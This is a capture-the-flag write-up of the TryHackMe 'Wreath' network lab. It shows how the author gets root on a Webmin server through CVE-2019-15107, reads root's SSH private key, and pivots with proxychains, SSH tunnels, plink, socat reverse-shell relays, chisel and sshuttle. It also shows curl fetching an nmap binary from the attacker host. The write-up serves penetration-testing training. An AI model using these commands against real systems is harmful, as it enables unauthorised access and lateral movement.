
# Wreath Room

Link to the room : https://tryhackme.com/room/wreath

My IP address : 10.10.156.24

My OS : Kali GNU/Linux 2021.2

## Gathered information about the network :

- There are three machines on the network, where at least one has public facing webserver turned on
- There is internal git server that is self-hosted somewhere in the network
- One of the machines has antivirus installes so we can assume this is Windows machine and we cannot acces it directly from the webserver

## Enumeration

First off we need to enumerate our target. There is only one IP provided for us (10.200.159.200) so we will start with this one.
```
sudo nmap -sSVC -p- 10.200.159.200

PORT    STATE   SERVICE and VERSION
22      open    ssh OpenSSH 8.0
80      open    http Apache 2.4.37 (centos)
443     open    ssl/http Apache 2.4.37 (centos)
9090    open    zeus-admin (probably not relevant)
10000   open    MiniServ 1.89 (webmin)
```
After that I usually scan the target again, with other parameters, to make sure that we didn't miss anything. For example :
```
sudo nmap -sV -p- -A -O 10.200.159.200 
```
We can't see any new services/ports but because of the -O parameter we get the 89% agressive OS guess that this machine is running Linux (we were able to retrieve this information
before from 80/443 port scan.

## Checking services

  ### HTTP
  
  After the enumeration we can check all of the available services. For example you can connect to the ssh `ssh root@10.200.159.200` and check if there is any banner shown.
  Next up we need to check the webpage. When we try to enter we are redirected to https://thomaswreath.thm/. As we can see there is no DNS that will resolve this for us. 
  To get access we need to edit our /etc/hosts file.
  ```
  10.200.159.200    thomaswreath.thm
  ```
  With that out of our way we are able to get access to this webpage where we are welcomed with resume website of Thomas Wreath.
  In real life penetration test you should "footprint" this person. That's what we will try to do but on a much lower scale. First up I will find everything that can be useful
  in the future that is on this website.
  1. Thomas' mobile phone number and phone number : +447821548812 and 01347 822945
  2. Thomas' address : 21 Highland Court in Yorkshire, England
  3. His mail : me@thomaswreath.thm

  Next up we can see that the page was done with the help of Online CV design by ThemeHippo. Sometimes it is useful information, for example when the site
  is made with wordpress.
  Normally we should enumerate this page with dirb/dirbuster/gobuster and maybe directory-list-2.3-medium.txt but for now we'll move on to the next service.
  
  ### Webmin HTTP
  
  We can start with checking if this version of the webmin is vulnerable to any exploit. Quick search with google gives us information that we wanted.
  On https://github.com/MuirlandOracle/ you are able to find the CVE-2019-15107 exploit that gives us unauthorized Remote Command Execution on this machine. 
  You can simply clone it onto your machine and install all of the requirements to run this exploit.
  ```
  git clone https://github.com/MuirlandOracle/CVE-2019-15107
  pip3 install -r requirements.txt
  chmod +x CVE-2019-15107.py
  ```
  After all of the requirements are satisfied we are able to obtain a reverse shell to the target machine.
  ```
  ./CVE-2019-15107.py 10.200.159.200
  ```
  Luckily this webserver is running as a root so we don't have to escalate our privileges! But still we have to stabilise our shell.
  There is this functionality to obtain a stable reverse shell with this CVE but I wasn't able to do it (couldn't type in my IP address and port where my netcat was listening)
  so I read the /.ssh/id_rsa file of root and connected through ssh to stabilise my shell.
  ```
  cat /root/.ssh/id_rsa
  nano id_rsa
  chmod 600 id_rsa
  ssh -i id_rsa root@10.200.159.200
  ```
  
 ## Pivoting
 
  Right now we are inside of first machine but we need to keep going and keep enumerating so we can start pivoting. Pivoting is the art of using access obtained over one machine
  to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing. There are two main methods of pivoting :
  - Tunnelling/Proxying - Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially
  also be tunnelled inside another protocol (e.g. SSH tunnelling) which can be useful for evading a basic IDS or firewall.
  - Port Forwarding - Creating a connection between a local port and a single port on a target via compromised host.
  
  Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed.
  
  ---
  
  ## Theory behind pivoting
  
  You can skip that part if you want to see only practical solutions for this room.
  Things that I'll focus on :
  - Proxy tools
  - Port forwarding methods
  - Stable linux shell with socat
  - Chisel as your proxy/port forwarding tool
  - sshuttle as your tunnelled proxy

  ### Proxy tool #1 - Proxychains
  
  Proxychains is a command line tool which is activated by prepending the command _proxychains_ to other commands. For example to proxy netcat it would look like this :
  ```
  proxychains nc 10.200.159.200 22
  ```
  The proxy port was not specified in the above command because proxychains reads its options from a config file (/etc/proxychains.conf). If you want to configure proxychains
  for a specific assignment you can copy this config file and make any changes in a copy stored in your current directory.
  
  One of the things to note when scanning through proxychains is that you can only use TCP scans. Because of that if you want to proxy nmap through proxychains you should always
  enable the -Pn switch to prevent from issuing ICMP echo requests.
  
  ### Proxy tool #2 - FoxyProxy
  
  This is an extension to your browser that you are probably already familiar with because a lot of pentesters use this tool to manage their BurpSuite/ZAP proxy quickly and
  easily. There is not much to say about this extension because it's really easy to use and manage.
  
  ### Forwarding connections
  
  Creating a forward SSH tunnel can be done if we have SSH access to the target machine. Port forwarding is accomplished with the -L switch which creates a link to a Local port.
  ```
  ssh -L 8000:10.200.159.200:80 user@10.200.159.200 -fN
  ```
  After execution we are able to get access to the default webpage of host 10.200.159.200 on http://127.0.0.1:8000/. The -fN switch backgrounds the shell immediately so that we 
  have our own terminal back and tells SSH that it doesn't need to execute any commands - only set up the connection. 
  
  Proxies are made using the -D switch. This is useful when combined with a tool such as proxychains.
  ```
  ssh -D 1336 user@10.200.159.200 -fN
  ```
  Having this proxy set up would allow us to route all of our traffic through into the target network.
  
  ### Reverse Connections
  
  These are riskier as you must access your attacking machine from the target - by using credentials or preferably key based system.
  First you need to generate a new set of SSH keys and store them somewhere safe `ssh-keygen`. Then you need to edit the /.ssh/authorized_keys file on your own
  attacking machine by adding :
  ```
  command="echo 'This account can only be used for port forwarding'",no-agen-forwarding,no-x11-forwarding,no-pty ssh-rsa <your public RSA key> 
  ```
  And finally you need to check the SSH service `sudo systemctl status ssh`. If it is up you can safely transfer your private key and proceed to setting up reverse connection.
  ```
  ssh -R <LOCAL PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<ATTACKING IP> -i id_rsa -fN
  ```
  To close any of these connections type `ps aux` and then `sudo kill PID`.
  
  ### Windows command line SSH
  
  Plink.exe is a tool that mimics the PuTTY SSH client in command line. The syntax of commands is really similar to linux SSH commands. 
  For example this is syntax to create a reverse connection :
  ```
  cmd.exe /c echo y | .\plink.exe -R <LOCAL PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<ATTACKING IP> -i id_rsa -N
  ```
  The `cmd.exe /c echo y` at the start is for non-interactive shells. Good thing to know is that keys generated by ssh-keygen will not work properly here.
  You will need to convert them using puttygen tool. 
  
  ### Socat
  
  With this tool every pentester should be familiar already. It's not just great for fully stable Linux shells, it's also superb for port forwarding.
  The biggest disadventage of socat is that it is very rarely installed by default on a target. But luckily you can easily find static binaries
  for both Windows and Linux. It's best to think of socat as a way to join two things together - kind of like the Portal gun. This could be two ports on the same machine, 
  it could be to create a connection between two different machines etc. 
  
  
  1. Reverse Shell Relay


      Attacker machine :
      ```
      sudo nc -lnvp 445
      ```
      Target machine :
      ```
      socat tcp-l:8000 tcp:<ATTACKING IP>:445 &
      ```
      In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. The ampersand & symbol at the end backgrounds
      this particular job.
  
  
  2. Port forwarding


      Target machine :
      ```
      socat tcp-l:<PORT TO RECEIVE>,fork,reuseaddr tcp:<TARGET IP>:<TARGET PORT> &
      ```
      Upon the execution we can connect to <PORT TO RECEIVE> and have our connection directly relayed to our intended target.

      To kill any of the jobs you created you need to simply find it in `jobs` and then `kill %<NUMBER OF THE JOB>`.

  ### Chisel
  
  It's an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH
  access or not. To work you must have an appropriate copy of the chisel binary on both the attacking machine and the compromised server. 
  
  
  1. Reverse SOCKS Proxy
  
  
      Attacker machine :
      ```
      chisel server -p <LISTEN PORT> --reverse &
      ```
      Target machine :
      ```
      chisel client <ATTACKING IP>:<LISTEN PORT> R:socks &
      ```
      This command connects back to the waiting listener on our attacking machine, completing the proxy. 
  
  
  2. Forward SOCKS Proxy
  
  
      Target machine :
      ```
      chisel server -p <LISTEN PORT> --socks5
      ```
      Attacker machine : 
      ```
      chisel client <TARGET IP>:<LISTEN PORT> <PROXY PORT>:socks
      ```
      In this command PROXY PORT is the port that will be opened for the proxy.

      ***Reminder*** 
      When sending data through either of these proxies we would need to est the port in our proxychains configuration. As chisel uses SOCKS5 proxy, we will also need
      to change the start of the line from socks4 to socks5.
  
  
  3. Remote Port Forward
  
  
      Attacker machine command is exact the same as with the Reverse SOCKS Proxy to setup a chisel listener to connect back to.
  
      Target machine :
      ```
      chisel client <ATTACKING IP>:<LISTEN PORT> R:<LOCAL PORT>:<TARGET IP>:<TARGET PORT> &
      ```
  
  
  4. Local Port Forward
  
  
      As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a target.
  
      Target machine :
      ```
      chisel server -p <LISTEN PORT>
      ```
      Attacker machine :
      ```
      chisel client <LISTEN IP>:<LISTEN PORT> <LOCAL PORT>:<TARGET IP>:<TARGET PORT>
      ```
  
  ### Sshuttle
  
  This tool is quite different because it doesn't perform a port forward, and the proxy it creates is nothing like the onew we have already seen.
  Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. It simulates a VPN, allowing us to route our traffic through the proxy
  without the use of proxychains. We can just directly connect to devices in the target network as we would normally connect to networked devices. we use sshuttle entirely
  on our attacking machine, in much the same way we would SSH into a remote server. But there are some drawbacks. For a start sshuttle only works on Linux targets, it also
  requires access to the target machine via SSH and the target machine must have python installed. 
  Sshuttle installing :
  ```
  sudo apt install sshuttle
  ```
  Base command for connecting to a server with sshuttle :
  ```
  sshuttle -r <USERNAME>@<TARGET IP> <TARGET SUBNET IP>
  ```
  But what happens if we don't have the user's password, or the server only accepts key-based authentication? Sshuttle doesn't currently seem to have a shorthand for specifying 
  a private key to authenticate to the server with. Because of that we use `--ssh-cmd` switch that allows us to specify what command gets executed by sshuttle.
  ```
  sshuttle -r <USERNAME>@<TARGET IP> --ssh-cmd "ssh -i <KEY FILE> <TARGET SUBNET IP>
  ```
  If we are connecting to the target machine and this target machine is part of the subnet we're attempting to gain access to we can stumble upon error code 255 or
  "Broken pipe". To get around this we tell sshuttle to exclude the compromised server from the subnet range using the `-x` switch.
  ```
  sshuttle -r <USERNAME>@<TARGET IP> <TARGET SUBNET IP> -x <TARGET IP>
  sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
  ```
  
  ---
  
  ## Enumerating before pivoting
  
  Information is power - our first step when attempting to pivot through a network is to get an idea of what's around us. Ideally we want to take advantage of pre-installed
  tools on the system to enumerate a network through a compromised host. This is called Living off the Land (LotL) - a good way to minimise risk.
  ```
  ifconfig
  arp -a
  cat /etc/hosts
  cat /etc/resolv.conf
  ```
  Next up we will download a static nmap binary on our attacker machine and download it using python server and `curl` to our target machine. 
  ```
  sudo python3 -m http.server 80
  curl <ATTACKER IP>/nmap -o /tmp/nmap && chmod +x /tmp/nmap
  ```
  With that binary we can scan the network from target machine. We should get some interesting hosts and services.
  ```
  ./nmap -sn 10.200.159.1-255 -oN scan.txt
  ```
  If you don't already know `-sn` switch is used to tell nmap not to scan any port and instead just determine which hosts are alive. We can do the same with `fping`.
  After that we can focus only on those hosts that are alive instead of scanning the whole network and all ports. It would be waste of our time.
  
  
  
